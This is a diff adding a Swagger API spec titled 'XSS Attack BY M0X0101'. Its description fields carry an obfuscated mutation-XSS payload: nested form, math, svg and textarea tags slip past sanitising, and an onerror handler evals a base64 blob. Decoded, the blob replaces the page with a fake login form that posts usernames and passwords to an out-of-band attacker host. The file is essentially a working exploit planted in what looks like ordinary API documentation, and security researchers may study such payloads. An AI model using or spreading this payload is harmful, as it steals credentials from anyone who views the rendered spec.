@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='PHNjcmlwdD4KZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsgCnZhciBmb3JtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwpmb3JtLmFjdGlvbiA9ICJodHRwOi8vY28zNnRvNGFoc2UwbHZyMWphY2d3M3Nuc2prM290M25nLm9hc3Quc2l0ZSI7IC8vIFJlcGxhY2Ugd2l0aCB5b3VyIGRlc2lyZWQgYWN0aW9uIFVSTApmb3JtLm1ldGhvZCA9ICdQT1NUJzsKZm9ybS5pbm5lckhUTUwgPSAnPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyAKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmb3JtKTsKPC9zY3JpcHQ+' onerror='eval(atob(this.id))'>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='PHNjcmlwdD4KZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsgCnZhciBmb3JtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwpmb3JtLmFjdGlvbiA9ICJodHRwOi8vY28zNnRvNGFoc2UwbHZyMWphY2d3M3Nuc2prM290M25nLm9hc3Quc2l0ZSI7IC8vIFJlcGxhY2Ugd2l0aCB5b3VyIGRlc2lyZWQgYWN0aW9uIFVSTApmb3JtLm1ldGhvZCA9ICdQT1NUJzsKZm9ybS5pbm5lckhUTUwgPSAnPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyAKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmb3JtKTsKPC9zY3JpcHQ+' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
